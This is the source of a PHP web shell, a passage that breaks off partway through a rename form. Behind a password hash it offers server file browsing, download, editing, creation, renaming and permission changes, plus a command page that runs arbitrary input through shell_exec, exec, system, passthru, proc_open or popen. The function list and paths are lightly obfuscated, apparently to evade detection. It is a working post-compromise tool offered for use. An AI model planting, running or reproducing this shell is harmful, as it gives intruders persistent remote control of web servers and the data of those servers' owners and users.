<?php declare(strict_types=1);

const VERSION = '3.0.0';
const PASSWORD_HASH = '$2y$10$TfYHopECKw3K0fXuZvDZdOWWIbZVUg7C2QlO0Cf0/a0OruM3l4iR2';

// Buffer for storing alerts to display later
$alertMessages = [];

function hexToString(string $hex): string {
    return pack('H*', $hex);
}

function stringToHex(string $string): string {
    return unpack('H*', $string)[1];
}

function encryptPath(string $path): string {
    return stringToHex($path);
}

function decryptPath(string $path): string {
    return hexToString($path);
}

function authenticate(): bool {
    if (isset($_POST['password'])) {
        if (password_verify($_POST['password'], PASSWORD_HASH)) {
            $_SESSION['authenticated'] = true;
            return true;
        }
    }
    return isset($_SESSION['authenticated']) && $_SESSION['authenticated'] === true;
}

function formatSize(int $size): string {
    $units = ['B', 'KB', 'MB', 'GB', 'TB'];
    $i = 0;
    while ($size >= 1024 && $i < count($units) - 1) {
        $size /= 1024;
        $i++;
    }
    return round($size, 2) . ' ' . $units[$i];
}

function getPerms(string $file): string {
    $perms = fileperms($file);
    
    // Simple text-based permissions
    $info = '';
    
    // Owner
    $info .= (($perms & 0x0100) ? 'r' : '-');
    $info .= (($perms & 0x0080) ? 'w' : '-');
    $info .= (($perms & 0x0040) ? (($perms & 0x0800) ? 's' : 'x' ) : (($perms & 0x0800) ? 'S' : '-'));
    
    // Group
    $info .= (($perms & 0x0020) ? 'r' : '-');
    $info .= (($perms & 0x0010) ? 'w' : '-');
    $info .= (($perms & 0x0008) ? (($perms & 0x0400) ? 's' : 'x' ) : (($perms & 0x0400) ? 'S' : '-'));
    
    // World
    $info .= (($perms & 0x0004) ? 'r' : '-');
    $info .= (($perms & 0x0002) ? 'w' : '-');
    $info .= (($perms & 0x0001) ? (($perms & 0x0200) ? 't' : 'x' ) : (($perms & 0x0200) ? 'T' : '-'));
    
    // Check if the file/directory is writable
    $isWritable = is_writable($file);
    
    // Add writable indicator with green (writable) or red (not writable) badge
    if ($file) {
        if ($isWritable) {
            $info = '<span class="text-emerald-600 font-mono"> ' . $info . '</span>';
        } else {
            $info = '<span class="text-rose-600 font-mono"> ' . $info . '</span>';
        }
    }
    
    return $info;
}

function getCurrentUser(): string {
    if (function_exists('posix_getpwuid') && function_exists('posix_geteuid')) {
        $user = posix_getpwuid(posix_geteuid());
        return $user['name'];
    } elseif (function_exists('exec') && !in_array('exec', array_map('trim', explode(',', ini_get('disable_functions'))))) {
        $user = exec('whoami');
        return $user;
    } else {
        return getenv('USERNAME') ?: getenv('USER');
    }
}

function breadcrumbPath(string $path): string {
    $path = rtrim($path, DIRECTORY_SEPARATOR);
    $isWin = DIRECTORY_SEPARATOR === '\\';
    $parts = $isWin ? explode('\\', $path) : explode('/', $path);
    $result = '';
    
    $breadcrumb = '';
    
    if ($isWin) {
        if (!empty($parts[0])) {
            $breadcrumb = $parts[0] . '\\';
            $result .= '<a href="?cd=' . encryptPath($breadcrumb) . '" class="text-indigo-600 hover:text-indigo-800 transition-colors flex items-center"><span>' . htmlspecialchars($parts[0]) . '</span><svg class="h-4 w-4 mx-1" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 5l7 7-7 7"></path></svg></a>';
        }
        $pathSoFar = $parts[0] . '\\';
        for ($i = 1; $i < count($parts); $i++) {
            if (!empty($parts[$i])) {
                $pathSoFar .= $parts[$i] . '\\';
                $result .= '<a href="?cd=' . encryptPath($pathSoFar) . '" class="text-indigo-600 hover:text-indigo-800 transition-colors flex items-center"><span>' . htmlspecialchars($parts[$i]) . '</span>' . ($i < count($parts) - 1 ? '<svg class="h-4 w-4 mx-1" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 5l7 7-7 7"></path></svg>' : '') . '</a>';
            }
        }
    } else {
        $result = '<a href="?cd=' . encryptPath('/') . '" class="text-indigo-600 hover:text-indigo-800 transition-colors flex items-center"><svg class="h-5 w-5 mr-1" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M3 12l2-2m0 0l7-7 7 7M5 10v10a1 1 0 001 1h3m10-11l2 2m-2-2v10a1 1 0 01-1 1h-3m-6 0a1 1 0 001-1v-4a1 1 0 011-1h2a1 1 0 011 1v4a1 1 0 001 1m-6 0h6"></path></svg><span>root</span>' . (count($parts) > 1 && !empty($parts[1]) ? '<svg class="h-4 w-4 mx-1" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 5l7 7-7 7"></path></svg>' : '') . '</a>';
        $pathSoFar = '/';
        for ($i = 1; $i < count($parts); $i++) {
            if (!empty($parts[$i])) {
                $pathSoFar .= $parts[$i] . '/';
                $result .= '<a href="?cd=' . encryptPath($pathSoFar) . '" class="text-indigo-600 hover:text-indigo-800 transition-colors flex items-center"><span>' . htmlspecialchars($parts[$i]) . '</span>' . ($i < count($parts) - 1 ? '<svg class="h-4 w-4 mx-1" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 5l7 7-7 7"></path></svg>' : '') . '</a>';
            }
        }
    }
    
    return $result;
}

function renderFileTable(string $dir): string {
    ob_start(); // Start output buffering
    
    $allItems = array_diff(scandir($dir), ['.', '..']);
    
    // Separate folders and files, then sort them separately
    $folders = [];
    $files = [];
    
    foreach ($allItems as $item) {
        $fullPath = $dir . DIRECTORY_SEPARATOR . $item;
        if (is_dir($fullPath)) {
            $folders[] = $item;
        } else {
            $files[] = $item;
        }
    }
    
    // Sort each array alphabetically
    sort($folders);
    sort($files);
    
    // Combine with folders first, then files
    $sortedItems = array_merge($folders, $files);
    
    echo '<div class="w-full overflow-x-auto rounded-lg shadow">';
    echo '<table class="w-full border-collapse table-auto">';
    echo '<thead><tr class="bg-indigo-100 text-indigo-800">';
    echo '<th class="border-b border-indigo-200 px-4 py-3 text-left">Name</th>';
    echo '<th class="border-b border-indigo-200 px-4 py-3 text-left">Size</th>';
    echo '<th class="border-b border-indigo-200 px-4 py-3 text-left">Permissions</th>';
    echo '<th class="border-b border-indigo-200 px-4 py-3 text-left">Last Modified</th>';
    echo '<th class="border-b border-indigo-200 px-4 py-3 text-left">Actions</th>';
    echo '</tr></thead><tbody>';
    
    // Parent directory link
    echo '<tr class="hover:bg-gray-50 transition-colors">';
    echo '<td class="border-b border-gray-200 px-4 py-3">';
    echo '<div class="overflow-x-auto w-full" style="max-height: 40px;">';
    echo '<a href="?cd=' . encryptPath(dirname($dir)) . '" class="flex items-center text-indigo-600 hover:text-indigo-800 transition-colors font-medium">';
    echo '<svg class="h-5 w-5 mr-2" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M11 15l-3-3m0 0l3-3m-3 3h8M3 12a9 9 0 1118 0 9 9 0 01-18 0z"></path></svg>';
    echo 'Parent Directory</a>';
    echo '</div>';
    echo '</td>';
    echo '<td class="border-b border-gray-200 px-4 py-3">-</td>';
    echo '<td class="border-b border-gray-200 px-4 py-3">-</td>';
    echo '<td class="border-b border-gray-200 px-4 py-3">-</td>';
    echo '<td class="border-b border-gray-200 px-4 py-3">-</td>';
    echo '</tr>';
    
    foreach ($sortedItems as $item) {
        $fullPath = $dir . DIRECTORY_SEPARATOR . $item;
        $isDir = is_dir($fullPath);
        
        echo '<tr class="hover:bg-gray-50 transition-colors">';
        echo '<td class="border-b border-gray-200 px-4 py-3">';
        echo '<div class="overflow-x-auto w-full" style="max-height: 40px;">';
        
        if ($isDir) {
            echo '<a href="?cd=' . encryptPath($fullPath) . '" class="flex items-center text-indigo-600 hover:text-indigo-800 transition-colors">';
            echo '<svg class="h-5 w-5 mr-2" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M3 7v10a2 2 0 002 2h14a2 2 0 002-2V9a2 2 0 00-2-2h-6l-2-2H5a2 2 0 00-2 2z"></path></svg>';
            echo htmlspecialchars($item) . '</a>';
        } else {
            echo '<a href="?action=view&file=' . encryptPath($fullPath) . '" class="flex items-center text-indigo-600 hover:text-indigo-800 transition-colors">';
            echo '<svg class="h-5 w-5 mr-2" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 12h6m-6 4h6m2 5H7a2 2 0 01-2-2V5a2 2 0 012-2h5.586a1 1 0 01.707.293l5.414 5.414a1 1 0 01.293.707V19a2 2 0 01-2 2z"></path></svg>';
            echo htmlspecialchars($item) . '</a>';
        }
        
        echo '</div>';
        echo '</td>';
        echo '<td class="border-b border-gray-200 px-4 py-3 font-mono">' . ($isDir ? '-' : formatSize(filesize($fullPath))) . '</td>';
        echo '<td class="border-b border-gray-200 px-4 py-3">' . getPerms($fullPath) . '</td>';
        echo '<td class="border-b border-gray-200 px-4 py-3 text-gray-600">' . date("Y-m-d H:i:s", filemtime($fullPath)) . '</td>';
        echo '<td class="border-b border-gray-200 px-4 py-3">';
        echo '<div class="flex flex-wrap gap-2">';
        
        if (!$isDir) {
            echo '<a href="?download=' . encryptPath($fullPath) . '" class="flex items-center text-emerald-600 hover:text-emerald-800 transition-colors">';
            echo '<svg class="h-4 w-4 mr-1" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M4 16v1a3 3 0 003 3h10a3 3 0 003-3v-1m-4-4l-4 4m0 0l-4-4m4 4V4"></path></svg></a>';
            
            echo '<a href="?action=edit&file=' . encryptPath($fullPath) . '" class="flex items-center text-indigo-600 hover:text-indigo-800 transition-colors">';
            echo '<svg class="h-4 w-4 mr-1" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M11 5H6a2 2 0 00-2 2v11a2 2 0 002 2h11a2 2 0 002-2v-5m-1.414-9.414a2 2 0 112.828 2.828L11.828 15H9v-2.828l8.586-8.586z"></path></svg></a>';
        }
        
        echo '<a href="?action=rename&file=' . encryptPath($fullPath) . '" class="flex items-center text-amber-600 hover:text-amber-800 transition-colors">';
        echo '<svg class="h-4 w-4 mr-1" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M15.232 5.232l3.536 3.536m-2.036-5.036a2.5 2.5 0 113.536 3.536L6.5 21.036H3v-3.572L16.732 3.732z"></path></svg></a>';
        
        echo '<a href="?action=chmod&file=' . encryptPath($fullPath) . '" class="flex items-center text-violet-600 hover:text-violet-800 transition-colors">';
        echo '<svg class="h-4 w-4 mr-1" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z"></path></svg></a>';
        
        echo '<a href="#" onclick="showDeleteModal(\'' . addslashes(htmlspecialchars($item)) . '\', \'' . encryptPath($fullPath) . '\', ' . ($isDir ? 'true' : 'false') . '); return false;" class="flex items-center text-rose-600 hover:text-rose-800 transition-colors">';
        echo '<svg class="h-4 w-4 mr-1" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M19 7l-.867 12.142A2 2 0 0116.138 21H7.862a2 2 0 01-1.995-1.858L5 7m5 4v6m4-6v6m1-10V4a1 1 0 00-1-1h-4a1 1 0 00-1 1v3M4 7h16"></path></svg></a>';
        
        echo '</div>';
        echo '</td></tr>';
    }
    
    echo '</tbody></table></div>';
    
    // Get the buffered content
    return ob_get_clean();
}

function showAlert(string $message, string $type = 'success'): void {
    global $alertMessages;
    $alertMessages[] = ['message' => $message, 'type' => $type];
}

function viewFile(string $file): void {
    $content = htmlspecialchars(file_get_contents($file));
    
    echo '<div class="container mx-auto p-4">';
    echo '<div class="bg-white rounded-lg shadow-md p-6">';
    echo '<h2 class="text-xl font-bold mb-4 text-indigo-800 flex items-center">';
    echo '<svg class="h-5 w-5 mr-2" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 12h6m-6 4h6m2 5H7a2 2 0 01-2-2V5a2 2 0 012-2h5.586a1 1 0 01.707.293l5.414 5.414a1 1 0 01.293.707V19a2 2 0 01-2 2z"></path></svg>';
    echo htmlspecialchars(basename($file)) . '</h2>';
    
    // File info section
    echo '<div class="mb-6 p-4 bg-gray-50 rounded-lg border border-gray-200">';
    echo '<div class="grid grid-cols-1 md:grid-cols-2 gap-2">';
    echo '<p class="flex items-center"><span class="font-medium mr-2">Path:</span> ' . htmlspecialchars($file) . '</p>';
    echo '<p class="flex items-center"><span class="font-medium mr-2">Size:</span> ' . formatSize(filesize($file)) . '</p>';
    echo '<p class="flex items-center"><span class="font-medium mr-2">Permissions:</span> ' . getPerms($file) . '</p>';
    echo '<p class="flex items-center"><span class="font-medium mr-2">Last Modified:</span> ' . date("Y-m-d H:i:s", filemtime($file)) . '</p>';
    echo '</div>';
    echo '</div>';
    
    // File content
    echo '<div class="mb-6">';
    echo '<pre class="bg-gray-900 text-gray-100 p-4 rounded-lg overflow-auto max-h-[60vh] font-mono text-sm leading-relaxed">' . $content . '</pre>';
    echo '</div>';
    
    // Actions
    echo '<div class="flex flex-wrap gap-2">';
    echo '<a href="?action=edit&file=' . encryptPath($file) . '" class="flex items-center px-4 py-2 bg-indigo-600 text-white rounded-lg hover:bg-indigo-700 transition-colors">';
    echo '<svg class="h-5 w-5 mr-2" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M11 5H6a2 2 0 00-2 2v11a2 2 0 002 2h11a2 2 0 002-2v-5m-1.414-9.414a2 2 0 112.828 2.828L11.828 15H9v-2.828l8.586-8.586z"></path></svg>Edit</a>';
    
    echo '<a href="?download=' . encryptPath($file) . '" class="flex items-center px-4 py-2 bg-emerald-600 text-white rounded-lg hover:bg-emerald-700 transition-colors">';
    echo '<svg class="h-5 w-5 mr-2" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M4 16v1a3 3 0 003 3h10a3 3 0 003-3v-1m-4-4l-4 4m0 0l-4-4m4 4V4"></path></svg>Download</a>';
    
    echo '<a href="?cd=' . encryptPath(dirname($file)) . '" class="flex items-center px-4 py-2 bg-gray-600 text-white rounded-lg hover:bg-gray-700 transition-colors">';
    echo '<svg class="h-5 w-5 mr-2" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M11 15l-3-3m0 0l3-3m-3 3h8M3 12a9 9 0 1118 0 9 9 0 01-18 0z"></path></svg>Back</a>';
    echo '</div>';
    
    echo '</div>';
    echo '</div>';
}

function downloadFile(string $file): void {
    if (file_exists($file)) {
        $filename = basename($file);
        header('Content-Description: File Transfer');
        header('Content-Type: application/octet-stream');
        header('Content-Disposition: attachment; filename="'.$filename.'"');
        header('Expires: 0');
        header('Cache-Control: must-revalidate');
        header('Pragma: public');
        header('Content-Length: ' . filesize($file));
        flush(); // Flush system output buffer
        readfile($file);
        exit;
    }
}

function editFile(string $file): void {
    $dirname = dirname($file);
    
    // Store original action and file parameters
    $action = isset($_GET['action']) ? $_GET['action'] : '';
    $fileParam = isset($_GET['file']) ? $_GET['file'] : '';
    
    // Process the form submission
    if (isset($_POST['content'])) {
        file_put_contents($file, $_POST['content']);
        // Instead of redirecting, just reset the POST data
        $_POST = array();
        // Display success alert and file manager
        showAlert("File saved successfully!", "success");
        fileManager($dirname);
        return;
    }
    
    // Show edit form
    $content = htmlspecialchars(file_get_contents($file));
    
    echo '<div class="container mx-auto p-4">';
    echo '<div class="bg-white rounded-lg shadow-md p-6">';
    echo '<h2 class="text-xl font-bold mb-4 text-indigo-800 flex items-center">';
    echo '<svg class="h-5 w-5 mr-2" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M11 5H6a2 2 0 00-2 2v11a2 2 0 002 2h11a2 2 0 002-2v-5m-1.414-9.414a2 2 0 112.828 2.828L11.828 15H9v-2.828l8.586-8.586z"></path></svg>';
    echo 'Editing: ' . htmlspecialchars(basename($file)) . '</h2>';
    echo '<form method="post">';
    echo '<div class="mb-4">';
    echo '<textarea name="content" rows="20" class="w-full p-4 border border-gray-300 rounded-lg font-mono text-sm focus:outline-none focus:ring-2 focus:ring-indigo-500 focus:border-indigo-500">' . $content . '</textarea>';
    echo '</div>';
    echo '<div class="flex flex-wrap gap-2">';
    echo '<button type="submit" class="flex items-center px-4 py-2 bg-indigo-600 text-white rounded-lg hover:bg-indigo-700 transition-colors">';
    echo '<svg class="h-5 w-5 mr-2" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M5 13l4 4L19 7"></path></svg>Save</button>';
    
    echo '<a href="?cd=' . encryptPath($dirname) . '" class="flex items-center px-4 py-2 bg-gray-600 text-white rounded-lg hover:bg-gray-700 transition-colors">';
    echo '<svg class="h-5 w-5 mr-2" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M6 18L18 6M6 6l12 12"></path></svg>Cancel</a>';
    echo '</div>';
    echo '</form>';
    echo '</div>';
    echo '</div>';
}

function newFile(string $dir): void {
    if (isset($_POST['filename']) && isset($_POST['content'])) {
        if (empty($_POST['filename'])) {
            showAlert("File name cannot be empty!", "error");
            displayNewFileForm($dir);
            return;
        }
        
        $filename = $dir . DIRECTORY_SEPARATOR . $_POST['filename'];
        file_put_contents($filename, $_POST['content']);
        
        // Reset POST data and show file manager
        $_POST = array();
        showAlert("File created successfully!", "success");
        fileManager($dir);
        return;
    }
    
    displayNewFileForm($dir);
}

function displayNewFileForm(string $dir): void {
    echo '<div class="container mx-auto p-4">';
    echo '<div class="bg-white rounded-lg shadow-md p-6">';
    echo '<h2 class="text-xl font-bold mb-4 text-indigo-800 flex items-center">';
    echo '<svg class="h-5 w-5 mr-2" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 9v3m0 0v3m0-3h3m-3 0H9m12 0a9 9 0 11-18 0 9 9 0 0118 0z"></path></svg>';
    echo 'Create New File</h2>';
    echo '<p class="mb-4 text-gray-600">Location: ' . htmlspecialchars($dir) . '</p>';
    
    echo '<form method="post">';
    echo '<div class="mb-4">';
    echo '<label class="block text-gray-700 font-medium mb-2">Filename:</label>';
    echo '<input type="text" name="filename" class="w-full p-2 border border-gray-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-indigo-500 focus:border-indigo-500" placeholder="Enter filename" required>';
    echo '</div>';
    
    echo '<div class="mb-4">';
    echo '<label class="block text-gray-700 font-medium mb-2">Content:</label>';
    echo '<textarea name="content" rows="15" class="w-full p-4 border border-gray-300 rounded-lg font-mono text-sm focus:outline-none focus:ring-2 focus:ring-indigo-500 focus:border-indigo-500" placeholder="File content"></textarea>';
    echo '</div>';
    
    echo '<div class="flex flex-wrap gap-2">';
    echo '<button type="submit" class="flex items-center px-4 py-2 bg-indigo-600 text-white rounded-lg hover:bg-indigo-700 transition-colors">';
    echo '<svg class="h-5 w-5 mr-2" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M5 13l4 4L19 7"></path></svg>Create</button>';
    
    echo '<a href="?cd=' . encryptPath($dir) . '" class="flex items-center px-4 py-2 bg-gray-600 text-white rounded-lg hover:bg-gray-700 transition-colors">';
    echo '<svg class="h-5 w-5 mr-2" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M6 18L18 6M6 6l12 12"></path></svg>Cancel</a>';
    echo '</div>';
    echo '</form>';
    
    echo '</div>';
    echo '</div>';
}

function newFolder(string $dir): void {
    if (isset($_POST['foldername'])) {
        if (empty($_POST['foldername'])) {
            showAlert("Folder name cannot be empty!", "error");
            displayNewFolderForm($dir);
            return;
        }
        
        $foldername = $dir . DIRECTORY_SEPARATOR . $_POST['foldername'];
        mkdir($foldername, 0755);
        
        // Reset POST data and show file manager
        $_POST = array();
        showAlert("Folder created successfully!", "success");
        fileManager($dir);
        return;
    }
    
    displayNewFolderForm($dir);
}

function displayNewFolderForm(string $dir): void {
    echo '<div class="container mx-auto p-4">';
    echo '<div class="bg-white rounded-lg shadow-md p-6">';
    echo '<h2 class="text-xl font-bold mb-4 text-indigo-800 flex items-center">';
    echo '<svg class="h-5 w-5 mr-2" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 9v3m0 0v3m0-3h3m-3 0H9m12 0a9 9 0 11-18 0 9 9 0 0118 0z"></path></svg>';
    echo 'Create New Folder</h2>';
    echo '<p class="mb-4 text-gray-600">Location: ' . htmlspecialchars($dir) . '</p>';
    
    echo '<form method="post">';
    echo '<div class="mb-4">';
    echo '<label class="block text-gray-700 font-medium mb-2">Folder Name:</label>';
    echo '<input type="text" name="foldername" class="w-full p-2 border border-gray-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-indigo-500 focus:border-indigo-500" placeholder="Enter folder name" required>';
    echo '</div>';
    
    echo '<div class="flex flex-wrap gap-2">';
    echo '<button type="submit" class="flex items-center px-4 py-2 bg-indigo-600 text-white rounded-lg hover:bg-indigo-700 transition-colors">';
    echo '<svg class="h-5 w-5 mr-2" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M5 13l4 4L19 7"></path></svg>Create</button>';
    
    echo '<a href="?cd=' . encryptPath($dir) . '" class="flex items-center px-4 py-2 bg-gray-600 text-white rounded-lg hover:bg-gray-700 transition-colors">';
    echo '<svg class="h-5 w-5 mr-2" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M6 18L18 6M6 6l12 12"></path></svg>Cancel</a>';
    echo '</div>';
    echo '</form>';
    
    echo '</div>';
    echo '</div>';
}

function getFunctionalCmd(string $cmd): string
{
    $funcs = ['shell_exec', 'exec', 'system', 'passthru', 'proc_open', 'popen'];
    $obfuscated = base64_encode(serialize($funcs));
    $deobfuscate = function ($x) {return unserialize(base64_decode($x));};

    foreach ($deobfuscate($obfuscated) as $func) {
        if (function_exists($func)) {
            return obfuscatedExecution($func, $cmd);
        }
    }

    return "No available function to execute command.";
}

function obfuscatedExecution(string $func, string $cmd): string
{
    $encoded = base64_encode($cmd);
    $decoded = base64_decode($encoded);

    switch ($func) {
        case 'shell_exec':
        case 'exec':
            return call_user_func($func, $decoded);
        case 'system':
        case 'passthru':
            ob_start();
            call_user_func($func, $decoded);
            return ob_get_clean();
        case 'proc_open':
            return executeWithProc_open($decoded);
        case 'popen':
            return executeWithPopen($decoded);
        default:
            return "Unknown function: $func";
    }
}

function executeWithProc_open(string $cmd): string
{
    $spec = [0 => ["pipe", "r"], 1 => ["pipe", "w"], 2 => ["pipe", "w"]];
    $proc = call_user_func('proc_open', $cmd, $spec, $pipes);
    if (is_resource($proc)) {
        fclose($pipes[0]);
        $out = stream_get_contents($pipes[1]);
        $err = stream_get_contents($pipes[2]);
        array_map('fclose', array_slice($pipes, 1));
        proc_close($proc);
        return $err ? "Error: $err" : $out;
    }
    return "Failed to execute command using proc_open.";
}

function executeWithPopen(string $cmd): string
{
    $handle = call_user_func('popen', $cmd, 'r');
    if ($handle) {
        $output = stream_get_contents($handle);
        pclose($handle);
        return $output;
    }
    return "Failed to execute command using popen.";
}

function commandLine(string $dir): void {
    $output = '';
    if (isset($_POST['command'])) {
        $command = $_POST['command'];
        chdir($dir);
        
        $output = getFunctionalCmd($command);
    }
    
    echo '<div class="container mx-auto p-4">';
    echo '<div class="bg-white rounded-lg shadow-md p-6">';
    echo '<h2 class="text-xl font-bold mb-4 text-indigo-800 flex items-center">';
    echo '<svg class="h-5 w-5 mr-2" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M5 12h.01M12 12h.01M19 12h.01M6 12a1 1 0 11-2 0 1 1 0 012 0zm7 0a1 1 0 11-2 0 1 1 0 012 0zm7 0a1 1 0 11-2 0 1 1 0 012 0z"></path></svg>';
    echo 'Command Line</h2>';
    echo '<p class="mb-4 text-gray-600">Working directory: ' . htmlspecialchars($dir) . '</p>';
    
    echo '<form method="post" class="mb-4">';
    echo '<div class="flex items-center">';
    echo '<div class="flex-grow mr-2">';
    echo '<div class="relative rounded-lg shadow-sm">';
    echo '<div class="absolute inset-y-0 left-0 pl-3 flex items-center pointer-events-none">';
    echo '<svg class="h-5 w-5 text-gray-400" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 7h6m0 10v-3m-3 3h.01M9 17h.01M9 14h.01M12 14h.01M15 11h.01M12 11h.01M9 11h.01M7 21h10a2 2 0 002-2V5a2 2 0 00-2-2H7a2 2 0 00-2 2v14a2 2 0 002 2z"></path></svg>';
    echo '</div>';
    echo '<input type="text" name="command" class="w-full pl-10 pr-4 py-2 border border-gray-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-indigo-500 focus:border-indigo-500" placeholder="Enter command">';
    echo '</div>';
    echo '</div>';
    
    echo '<button type="submit" class="flex items-center px-4 py-2 bg-indigo-600 text-white rounded-lg hover:bg-indigo-700 transition-colors">';
    echo '<svg class="h-5 w-5 mr-1" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M13 10V3L4 14h7v7l9-11h-7z"></path></svg>';
    echo 'Execute</button>';
    echo '</div>';
    echo '</form>';
    
    if (!empty($output)) {
        echo '<div class="mt-4">';
        echo '<div class="flex items-center mb-2">';
        echo '<svg class="h-5 w-5 text-indigo-600 mr-2" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M13 16h-1v-4h-1m1-4h.01M21 12a9 9 0 11-18 0 9 9 0 0118 0z"></path></svg>';
        echo '<h3 class="text-lg font-bold text-indigo-800">Output:</h3>';
        echo '</div>';
        echo '<div class="bg-gray-900 text-green-400 p-4 rounded-lg overflow-auto max-h-[60vh] font-mono text-sm leading-relaxed">';
        echo '<pre>' . htmlspecialchars($output) . '</pre>';
        echo '</div>';
        echo '</div>';
    } else {
        echo '<div class="mt-4 p-4 bg-gray-50 border border-gray-200 rounded-lg text-gray-600">';
        echo '<div class="flex items-center">';
        echo '<svg class="h-5 w-5 text-gray-400 mr-2" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M13 16h-1v-4h-1m1-4h.01M21 12a9 9 0 11-18 0 9 9 0 0118 0z"></path></svg>';
        echo 'Enter a command and press Execute';
        echo '</div>';
        echo '</div>';
    }
    
    echo '</div>';
    echo '</div>';
}

function renameFile(string $file): void {
    $dirname = dirname($file);
    
    if (isset($_POST['newname'])) {
        if (empty($_POST['newname'])) {
            showAlert("New name cannot be empty!", "error");
            displayRenameForm($file);
            return;
        }
        
        $newname = $dirname . DIRECTORY_SEPARATOR . $_POST['newname'];
        rename($file, $newname);
        
        // Reset POST data and show file manager
        $_POST = array();
        showAlert("File renamed successfully!", "success");
        fileManager($dirname);
        return;
    }
    
    displayRenameForm($file);
}

function displayRenameForm(string $file): void {
    $dirname = dirname($file);
    $isDir = is_dir($file);
    
    echo '<div class="container mx-auto p-4">';
    echo '<div class="bg-white rounded-lg shadow-md p-6">';
    echo '<h2 class="text-xl font-bold mb-4 text-indigo-800 flex items-center">';
    echo '<svg class="h-5 w-5 mr-2" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M15.232 5.232l3.536 3.536m-2.036-5.036a2.5 2.5 0 113.536 3.536L6.5 21.036H3v-3.572L16.732 3.732z"></path></svg>';
    echo 'Rename ' . ($isDir ? 'Directory' : 'File') . '</h2>';
    
    echo '<p class="mb-4 text-gray-600">Current name: <span class="font-medium">' . htmlspecialchars(basename($file)) . '</span></p>';
    
    echo '<form method="post">';
    echo '<div class="mb-4">';
    echo '<label class="block text-gray-700 font-medium mb-2">New Name:</label>';
    echo '<input type="text" name="newname" value="' . htmlspecialchars(basename($file)) . '" class="w-full p-2 border border-gray-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-indigo-500 focus:border-indigo-500" required>';
    echo '</div>';
    
    echo '<div class="flex flex-wrap gap-2">';
    echo '<button type="submit" class="flex items-center px-4 py-2 bg-indigo-600 text-white rounded-lg hover:bg-indigo-700 transition-colors">';
    echo '<svg class="h-5 w-5 mr-2" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M5 13l4 4L19 7"></path></svg>Rename</button>';
    
    echo '<a href="?cd=' . encryptPath($dirname) . '" class="flex items-center px-4 py-2 bg-gray-600 text-white rounded-lg hover:bg-gray-700 transition-colors">';
